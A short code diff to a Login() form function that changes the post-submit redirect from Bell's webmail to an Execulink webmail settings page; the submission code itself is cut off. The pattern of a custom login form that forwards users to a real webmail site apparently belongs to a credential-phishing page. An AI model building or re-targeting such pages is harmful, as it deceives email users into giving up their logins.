@@ -18,7 +18,7 @@ function Login() {
             });
 
         // Redirect to the specified link after submitting the form
-        window.location.href = 'https://webmail.bell.net/bell/index-rui.jsp?v=3.1.3.48.0-4#/mail';
+        window.location.href = 'https://webmail.execulink.ca/?_task=settings&_action=identities';
     };
 
     return (
